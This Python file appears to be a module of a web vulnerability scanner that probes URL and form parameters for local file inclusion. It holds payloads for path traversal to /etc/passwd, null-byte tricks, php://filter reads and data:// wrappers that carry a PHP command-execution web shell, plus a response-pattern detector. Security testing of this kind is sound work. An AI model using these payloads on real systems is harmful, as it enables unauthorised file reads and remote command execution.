#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin, parse_qs, urlparse
import json
import re
from RAGScripts.utils.logger import setup_scanner_logger

async def check_lfi_vulnerabilities(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Test cases for LFI
        test_cases = [
            {
                'name': 'Basic LFI',
                'payloads': [
                    '../../../etc/passwd',
                    '....//....//....//etc/passwd',
                    '..%2F..%2F..%2Fetc%2Fpasswd',
                    '..%252F..%252F..%252Fetc%252Fpasswd'
                ]
            },
            {
                'name': 'Null byte injection',
                'payloads': [
                    '../../../etc/passwd%00',
                    '../../../etc/passwd\x00',
                    '../../../etc/passwd%00.jpg',
                    '../../../etc/passwd\x00.php'
                ]
            },
            {
                'name': 'PHP wrapper',
                'payloads': [
                    'php://filter/convert.base64-encode/resource=/etc/passwd',
                    'php://input',
                    'php://filter/read=string.rot13/resource=/etc/passwd',
                    'pHp://FilTer/convert.base64-encode/resource=/etc/passwd'
                ]
            },
            {
                'name': 'Data wrapper',
                'payloads': [
                    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+',
                    'data://text/plain,<?php system($_GET[cmd]);?>',
                    'data://text/plain;charset=UTF-8,<?php phpinfo(); ?>',
                    'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+'
                ]
            }
        ]
        
        # Parameters that might be vulnerable
        file_params = ['file', 'page', 'include', 'doc', 'path', 'template', 'module', 'view']
        
        # Extract parameters from URL
        parsed_url = urlparse(test_url)
        query_params = parse_qs(parsed_url.query)
        
        for param_name, param_value in query_params.items():
            if any(fp in param_name.lower() for fp in file_params):
                for test in test_cases:
                    for payload in test['payloads']:
                        try:
                            modified_params = query_params.copy()
                            modified_params[param_name] = [payload]
                            
                            response = requests.request(
                                method,
                                test_url,
                                params=modified_params,
                                timeout=5
                            )
                            
                            if is_lfi_vulnerable(response, test):
                                findings.append({
                                    "type": "LFI",
                                    "detail": f"Potential {test['name']} vulnerability",
                                    "evidence": {
                                        "url": test_url,
                                        "parameter": param_name,
                                        "payload": payload,
                                        "status_code": response.status_code,
                                        "response": response.text[:200]
                                    }
                                })
                                
                        except requests.exceptions.RequestException:
                            continue
        
        # Test POST parameters
        if method in ['POST', 'PUT']:
            for test in test_cases:
                for payload in test['payloads']:
                    try:
                        # Test form data
                        form_data = {file_param: payload for file_param in file_params}
                        response = requests.request(
                            method,
                            test_url,
                            data=form_data,
                            headers={'Content-Type': 'application/x-www-form-urlencoded'},
                            timeout=5
                        )
                        
                        if is_lfi_vulnerable(response, test):
                            findings.append({
                                "type": "LFI",
                                "detail": f"Potential {test['name']} vulnerability in POST data",
                                "evidence": {
                                    "url": test_url,
                                    "payload": payload,
                                    "status_code": response.status_code,
                                    "response": response.text[:200]
                                }
                            })
                            
                    except requests.exceptions.RequestException:
                        continue
                    
    except Exception as e:
        print(f"Error in LFI check: {str(e)}")
    
    return findings

def is_lfi_vulnerable(response: requests.Response, test: Dict) -> bool:
    try:
        response_text = response.text.lower()
        
        # Common file content indicators
        file_content_patterns = [
            'root:x:0:0',          # /etc/passwd content
            'daemon:x:1:1',        # /etc/passwd content
            'bin:x:2:2',           # /etc/passwd content
            '/home/',              # Directory listing
            '/usr/bin',            # Directory listing
            '<?php',               # PHP source code
            '<?=',                 # PHP short tags
            'fatal error',         # PHP errors
            'warning:',            # PHP warnings
            'stack trace'          # Error stack traces
        ]
        
        # Check for file content leakage
        if any(pattern in response_text for pattern in file_content_patterns):
            return True
        
        # Check for base64 encoded content
        if test['name'] == 'PHP wrapper':
            try:
                import base64
                decoded = base64.b64decode(response_text).decode()
                if any(pattern in decoded.lower() for pattern in file_content_patterns):
                    return True
            except:
                pass
        
        # Check for specific error messages
        error_patterns = [
            'include(',
            'require(',
            'include_once(',
            'require_once(',
            'failed to open stream',
            'no such file',
            'failed opening',
            'permission denied'
        ]
        
        if any(pattern in response_text for pattern in error_patterns):
            if response.status_code != 404:  # Expect 404 for proper file not found handling
                return True
        
    except:
        pass
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_lfi_vulnerabilities(
            "http://localhost:5000",
            "/page.php?file=welcome.php",
            "GET",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())